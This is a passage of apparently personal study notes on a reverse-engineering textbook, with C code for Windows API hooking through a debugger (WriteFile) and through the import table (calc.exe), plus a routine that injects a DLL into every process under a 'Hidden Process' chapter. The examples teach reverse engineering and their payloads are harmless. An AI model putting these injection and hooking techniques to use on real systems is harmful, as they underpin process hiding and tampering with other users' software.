class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int main(int argc, char* argv[])<br>&#123;<br>    DWORD dwPID;<br><br>    if( argc != 2 )<br>    &#123;<br>        printf(&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;);<br>        return 1;<br>    &#125;<br><br>    //Attach Process<br>    dwPID = atoi(argv[1]);<br>    if( !DebugActiveProcess(dwPID) )<br>    &#123;<br>        printf(&quot;DebugActiveProcess(%d) failed!!!\n&quot;<br>               &quot;Error Code = %d\n&quot;, dwPID, GetLastError());<br>        return 1;<br>    &#125;<br><br>    //Debugger loop<br>    DebugLoop();<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></p><p><strong>DebugLoop()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void DebugLoop()<br>&#123;<br>    DEBUG_EVENT de;<br>    DWORD dwContinueStatus;<br><br>    //Waiting for debuggee event.<br>    while( WaitForDebugEvent(&amp;de, INFINITE) )<br>    &#123;<br>        dwContinueStatus = DBG_CONTINUE;<br><br>        //Debuggee process is created or attached.<br>        if( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )<br>        &#123;<br>            OnCreateProcessDebugEvent(&amp;de);<br>        &#125;<br>        //Exception<br>        else if( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode )<br>        &#123;<br>            if( OnExceptionDebugEvent(&amp;de) )<br>                continue;<br>        &#125;<br>        //Event of debuggee is terminated.<br>        else if( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )<br>        &#123;<br>            // debuggee 종료 -&gt; debugger 종료<br>            break;<br>        &#125;<br><br>        //Continue debuggee.<br>        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><p><strong>DEBUG_EVENT structure</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _DEBUG_EVENT &#123;<br>  DWORD dwDebugEventCode;<br>  DWORD dwProcessId;<br>  DWORD dwThreadId;<br>  union &#123;<br>    EXCEPTION_DEBUG_INFO      Exception;<br>    CREATE_THREAD_DEBUG_INFO  CreateThread;<br>    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;<br>    EXIT_THREAD_DEBUG_INFO    ExitThread;<br>    EXIT_PROCESS_DEBUG_INFO   ExitProcess;<br>    LOAD_DLL_DEBUG_INFO       LoadDll;<br>    UNLOAD_DLL_DEBUG_INFO     UnloadDll;<br>    OUTPUT_DEBUG_STRING_INFO  DebugString;<br>    RIP_INFO                  RipInfo;<br>  &#125; u;<br>&#125; DEBUG_EVENT, *LPDEBUG_EVENT;<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event<br></code></pre></td></tr></table></figure></p><p><strong>OnCreateProcessDebugEvent()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)<br>&#123;<br>    // WriteFile() API 주소 구하기<br>    g_pfWriteFile = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;);<br><br>    // API Hook - WriteFile()<br>    //   첫 번째 byte 를 0xCC (INT 3) 으로 변경 <br>    //   (orginal byte 는 백업)<br>    memcpy(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO));<br>    ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                      &amp;g_chOrgByte, sizeof(BYTE), NULL);<br>    WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                       &amp;g_chINT3, sizeof(BYTE), NULL);<br><br>    return TRUE;<br>&#125;<br></code></pre></td></tr></table></figure></p><p><strong>OnExceptionDebugEvent()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)<br>&#123;<br>    CONTEXT ctx;<br>    PBYTE lpBuffer = NULL;<br>    DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;<br>    PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;<br><br>    //BreakPoint exception (INT 3)<br>    if( EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode )<br>    &#123;<br>        //if BP address is the address of WriteFile()<br>        if( g_pfWriteFile == per-&gt;ExceptionAddress )<br>        &#123;<br>            // #1. Unhook<br>            //0xCC -&gt; original byte<br>            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                               &amp;g_chOrgByte, sizeof(BYTE), NULL);<br><br>            // #2. Thread Context<br>            ctx.ContextFlags = CONTEXT_CONTROL;<br>            GetThreadContext(g_cpdi.hThread, &amp;ctx);<br><br>            // #3. WriteFile(), param 2, 3<br>            //   함수의 파라미터는 해당 프로세스의 스택에 존재함<br>            //   param 2 : ESP + 0x8<br>            //   param 3 : ESP + 0xC<br>            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), <br>                              &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);<br>            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0xC), <br>                              &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL);<br><br>            // #4. 임시 버퍼 할당<br>            lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1);<br>            memset(lpBuffer, 0, dwNumOfBytesToWrite+1);<br><br>            // #5. WriteFile() 의 버퍼를 임시 버퍼에 복사<br>            ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, <br>                              lpBuffer, dwNumOfBytesToWrite, NULL);<br>            printf(&quot;\n### original string ###\n%s\n&quot;, lpBuffer);<br><br>            // #6. 소문자 -&gt; 대문자 변환<br>            for( i = 0; i &lt; dwNumOfBytesToWrite; i++ )<br>            &#123;<br>                if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A )<br>                    lpBuffer[i] -= 0x20;<br>            &#125;<br><br>            printf(&quot;\n### converted string ###\n%s\n&quot;, lpBuffer);<br><br>            // #7. 변환된 버퍼를 WriteFile() 버퍼로 복사<br>            WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, <br>                               lpBuffer, dwNumOfBytesToWrite, NULL);<br>            <br>            // #8. 임시 버퍼 해제<br>            free(lpBuffer);<br><br>            // #9. Thread Context 의 EIP 를 WriteFile() 시작으로 변경<br>            //   (현재는 WriteFile() + 1 만큼 지나왔음)<br>            ctx.Eip = (DWORD)g_pfWriteFile;<br>            SetThreadContext(g_cpdi.hThread, &amp;ctx);<br><br>            // #10. Debuggee 프로세스를 진행시킴<br>            ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);<br>            Sleep(0);<br><br>            // #11. API Hook<br>            WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, <br>                               &amp;g_chINT3, sizeof(BYTE), NULL);<br><br>            return TRUE;<br>        &#125;<br>    &#125;<br><br>    return FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><br><strong>CONTEXT (x86 32-bit)</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _CONTEXT &#123;<br>  DWORD              ContextFlags;<br>  DWORD              Dr0;<br>  DWORD              Dr1;<br>  DWORD              Dr2;<br>  DWORD              Dr3;<br>  DWORD              Dr6;<br>  DWORD              Dr7;<br>  FLOATING_SAVE_AREA FloatSave;<br>  DWORD              SegGs;<br>  DWORD              SegFs;<br>  DWORD              SegEs;<br>  DWORD              SegDs;<br>  DWORD              Edi;<br>  DWORD              Esi;<br>  DWORD              Ebx;<br>  DWORD              Edx;<br>  DWORD              Ecx;<br>  DWORD              Eax;<br>  DWORD              Ebp;<br>  DWORD              Eip;<br>  DWORD              SegCs;<br>  DWORD              EFlags;<br>  DWORD              Esp;<br>  DWORD              SegSs;<br>  BYTE               ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];<br>&#125; CONTEXT;<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-31-Debugger"><a href="#Chapter-31-Debugger" class="headerlink" title="Chapter 31 - Debugger"></a>Chapter 31 - Debugger</h1><h2 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h2><h2 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA Pro"></a>IDA Pro</h2><h2 id="WinDbg"><a href="#WinDbg" class="headerlink" title="WinDbg"></a>WinDbg</h2><h1 id="Chapter-32-Displaying-Korean-in-calc-exe"><a href="#Chapter-32-Displaying-Korean-in-calc-exe" class="headerlink" title="Chapter 32 - Displaying Korean in calc.exe"></a>Chapter 32 - Displaying Korean in <code>calc.exe</code></h1><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/32.1.png'><img src="/images/books/ReverseEngineeringCore/32.1.png" width="800"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL SetWindowTextA(<br>  [in]           HWND   hWnd,<br>  [in, optional] LPCSTR lpString<br>);<br><br>//Source: https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-setwindowtexta<br></code></pre></td></tr></table></figure><p>Here <strong>W</strong> stands for <strong>Wide Character</strong> version. <strong>A</strong> stands for <strong>ASCII</strong> version.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/32.2.png'><img src="/images/books/ReverseEngineeringCore/32.2.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/32.4.png'><img src="/images/books/ReverseEngineeringCore/32.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/32.5.png'><img src="/images/books/ReverseEngineeringCore/32.5.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/32.2.png'><img src="/images/books/ReverseEngineeringCore/32.2.png" width="700"></p><blockquote><p>Important: Notice that <strong>Little-endian</strong> is used on x32 platform. Thus, you must enter the hexadecimal unicode in reversed. In addition, Unicode is constituted by 2 bytes (16 bits).</p></blockquote><h2 id="32-4-Practice"><a href="#32-4-Practice" class="headerlink" title="32.4 - Practice"></a>32.4 - Practice</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; InjectDll.exe -e 3192 C:\work\hookiat.dll<br></code></pre></td></tr></table></figure><h2 id="32-5-Code"><a href="#32-5-Code" class="headerlink" title="32.5 - Code"></a>32.5 - Code</h2><p><strong>DllMain()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br>&#123;<br>switch( fdwReason )<br>&#123;<br>case DLL_PROCESS_ATTACH : <br>            // original API 주소 저장<br>           g_pOrgFunc = GetProcAddress(GetModuleHandle(L&quot;user32.dll&quot;), <br>                                        &quot;SetWindowTextW&quot;);<br><br>            // # hook<br>            //   user32!SetWindowTextW() 를 hookiat!MySetWindowText() 로 후킹<br>hook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);<br>break;<br><br>case DLL_PROCESS_DETACH :<br>            // # unhook<br>            //   calc.exe 의 IAT 를 원래대로 복원<br>            hook_iat(&quot;user32.dll&quot;, (PROC)MySetWindowTextW, g_pOrgFunc);<br>break;<br>&#125;<br><br>return TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><br><strong>MySetWindowTextW()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)<br>&#123;<br>    wchar_t* pNum = L&quot;영일이삼사오육칠팔구&quot;; //0123456789 or 零一二三四五六七八九<br>    wchar_t temp[2] = &#123;0,&#125;;<br>    int i = 0, nLen = 0, nIndex = 0;<br><br>    nLen = wcslen(lpString);<br>    for(i = 0; i &lt; nLen; i++)<br>    &#123;<br>        // &#x27;수&#x27;문자를 &#x27;한글&#x27;문자로 변환<br>        //   lpString 은 wide-character (2 byte) 문자열<br>        if( L&#x27;0&#x27; &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L&#x27;9&#x27; )<br>        &#123;<br>            temp[0] = lpString[i];<br>            nIndex = _wtoi(temp);<br>            lpString[i] = pNum[nIndex];<br>        &#125;<br>    &#125;<br><br>    // user32!SetWindowTextW() API 호출<br>    //   (위에서 lpString 버퍼 내용을 변경하였음)<br>    return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><p><strong>hook_iat()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)<br>&#123;<br>HMODULE hMod;<br>LPCSTR szLibName;<br>PIMAGE_IMPORT_DESCRIPTOR pImportDesc; <br>PIMAGE_THUNK_DATA pThunk;<br>DWORD dwOldProtect, dwRVA;<br>PBYTE pAddr;<br><br>    // hMod, pAddr = ImageBase of calc.exe<br>    //             = VA to MZ signature (IMAGE_DOS_HEADER)<br>hMod = GetModuleHandle(NULL);<br>pAddr = (PBYTE)hMod;<br><br>    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)<br>pAddr += *((DWORD*)&amp;pAddr[0x3C]);<br><br>    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table<br>dwRVA = *((DWORD*)&amp;pAddr[0x80]);<br><br>    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table<br>pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);<br><br>for( ; pImportDesc-&gt;Name; pImportDesc++ )<br>&#123;<br>        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name<br>szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);<br>if( !_stricmp(szLibName, szDllName) )<br>&#123;<br>            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk<br>            //        = VA to IAT(Import Address Table)<br>pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + <br>                                         pImportDesc-&gt;FirstThunk);<br><br>            // pThunk-&gt;u1.Function = VA to API<br>for( ; pThunk-&gt;u1.Function; pThunk++ )<br>&#123;<br>if( pThunk-&gt;u1.Function == (DWORD)pfnOrg )<br>&#123;<br>                    //Modify the attribute of memory to E/R/W<br>VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <br>                                   4, <br>                                   PAGE_EXECUTE_READWRITE, <br>                                   &amp;dwOldProtect);<br><br>                    //Modify IAT value (Hooking).<br>                    pThunk-&gt;u1.Function = (DWORD)pfnNew;<br><br>                    //Redo modification.<br>                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <br>                                   4, <br>                                   dwOldProtect, <br>                                   &amp;dwOldProtect);<br><br>return TRUE;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br>return FALSE;<br>&#125;<br><br></code></pre></td></tr></table></figure></p><hr><p><strong>IAT structure</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hMod = GetModuleHandle(NULL);       // hMod = ImageBase<br>pAddr = (PBYTE)hMod;                // pAddr = ImageBase<br>pAddr += *((DWORD*)&amp;pAddr[0x3C]);   // pAddr = &quot;PE&quot; signature<br>dwRVA = *((DWORD*)&amp;pAddr[0x80]);    // dwRVA = RVA of IMAGE_IMPORT_DESCRIPTOR<br><br>pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-33-Hidden-Process"><a href="#Chapter-33-Hidden-Process" class="headerlink" title="Chapter 33 - Hidden Process"></a>Chapter 33 - Hidden Process</h1><h2 id="33-3-Hidden-Process"><a href="#33-3-Hidden-Process" class="headerlink" title="33.3 - Hidden Process"></a>33.3 - Hidden Process</h2><p><strong>CreateToolhelp32Snapshot()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HANDLE CreateToolhelp32Snapshot(<br>  [in] DWORD dwFlags,<br>  [in] DWORD th32ProcessID<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot<br></code></pre></td></tr></table></figure></p><p><strong>EnumProcess()</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL EnumProcesses(<br>  [out] DWORD   *lpidProcess,<br>  [in]  DWORD   cb,<br>  [out] LPDWORD lpcbNeeded<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses<br></code></pre></td></tr></table></figure></h2><p><strong>ZwQuerySystemInformation()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">NTSTATUS WINAPI ZwQuerySystemInformation(<br>  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,<br>  _Inout_   PVOID                    SystemInformation,<br>  _In_      ULONG                    SystemInformationLength,<br>  _Out_opt_ PULONG                   ReturnLength<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/sysinfo/zwquerysysteminformation<br></code></pre></td></tr></table></figure></p><h2 id="33-4-Practice"><a href="#33-4-Practice" class="headerlink" title="33.4 - Practice"></a>33.4 - Practice</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)<br>&#123;<br>DWORD                   dwPID = 0;<br>HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;<br>PROCESSENTRY32          pe;<br><br>// Get the snapshot of the system<br>pe.dwSize = sizeof( PROCESSENTRY32 );<br>hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );<br><br>// find process<br>Process32First(hSnapShot, &amp;pe);<br>do<br>&#123;<br>dwPID = pe.th32ProcessID;<br><br>        // 시스템의 안정성을 위해서<br>        // PID 가 100 보다 작은 시스템 프로세스에 대해서는<br>        // DLL Injection 을 수행하지 않는다.<br>if( dwPID &lt; 100 )<br>continue;<br><br>        if( nMode == INJECTION_MODE )<br>    InjectDll(dwPID, szDllPath);<br>        else<br>            EjectDll(dwPID, szDllPath);<br>&#125;<br>while( Process32Next(hSnapShot, &amp;pe) );<br><br>CloseHandle(hSnapShot);<br><br>return TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="33-5-HideProc"><a href="#33-5-HideProc" class="headerlink" title="33.5 - HideProc"></a>33.5 - HideProc</h2><h1 id="Chapter-34-Global-API-Hooking"><a href="#Chapter-34-Global-API-Hooking" class="headerlink" title="Chapter 34 - Global API Hooking"></a>Chapter 34 - Global API Hooking</h1><h1 id="Chapter-35-How-to-Choose-Your-Tools"><a href="#Chapter-35-How-to-Choose-Your-Tools" class="headerlink" title="Chapter 35 - How to Choose Your Tools"></a>Chapter 35 - How to Choose Your Tools</h1><h1 id="Chapter-36-64-bit"><a href="#Chapter-36-64-bit" class="headerlink" title="Chapter 36 - 64-bit"></a>Chapter 36 - 64-bit</h1><h2 id="36-1-64-bit-Processing"><a href="#36-1-64-bit-Processing" class="headerlink" title="36.1 - 64-bit Processing"></a>36.1 - 64-bit Processing</h2><div class="table-container"><table><thead><tr><th>Terminology</th><th>Meaning</th></tr></thead><tbody><tr><td>AMB64</td><td>64-bit processors developed by AMD.</td></tr><tr><td>EM64T</td><td>64-bit processors developed by Intel. They support AMD64.</td></tr><tr><td>Intel64</td><td>New name of EM64T.</td></tr><tr><td>IA-64</td><td>64-bit CPUs developed by Intel and HP.</td></tr><tr><td>x86</td><td>CPUs of Intel IA-32, IA-16 and IA-8.</td></tr><tr><td>x64</td><td>AMD64 &amp; Intel64</td></tr></tbody></table></div><h1 id="Chapter-37-x64-Processor"><a href="#Chapter-37-x64-Processor" class="headerlink" title="Chapter 37 - x64 Processor"></a>Chapter 37 - x64 Processor</h1><h1 id="Chapter-38-PE32"><a href="#Chapter-38-PE32" class="headerlink" title="Chapter 38 - PE32+"></a>Chapter 38 - PE32+</h1><p><strong>IMAGE_NT_HEADERS</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_NT_HEADERS64 &#123;<br>  DWORD Signature;<br>  IMAGE_FILE_HEADER FileHeader;<br>  IMAGE_OPTIONAL_HEADER64 OptionalHeader;<br>&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;<br><br>typedef struct _IMAGE_NT_HEADERS &#123;<br>  DWORD Signature; /* &quot;PE&quot;\0\0 *//* 0x00 */<br>  IMAGE_FILE_HEADER FileHeader;/* 0x04 */<br>  IMAGE_OPTIONAL_HEADER32 OptionalHeader;/* 0x18 */<br>&#125; 